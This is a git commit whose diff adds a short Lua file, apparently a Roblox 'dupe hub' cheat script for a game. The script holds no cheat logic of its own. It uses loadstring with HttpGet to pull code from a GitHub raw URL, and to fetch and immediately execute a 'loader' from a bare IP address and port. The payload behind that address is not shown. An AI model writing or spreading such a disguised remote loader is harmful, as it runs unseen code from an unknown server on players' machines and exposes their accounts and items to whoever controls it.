8a5a0ca1ac2cbcbdd0a4f0686a5fc1fa725616bc
Silentx <silentxvn@gmail.com>
2025-11-06 11:55:08 +0700

    Update and rename DupeHub.lua to Dupe-hub.lua

---
+++ Dupe-hub.lua
@@ -0,0 +1,4 @@
+ID="9cf507ca-e866-4299-9303-1bb7cee4af2e";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/main/Dupe-hub.lua"));
+
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
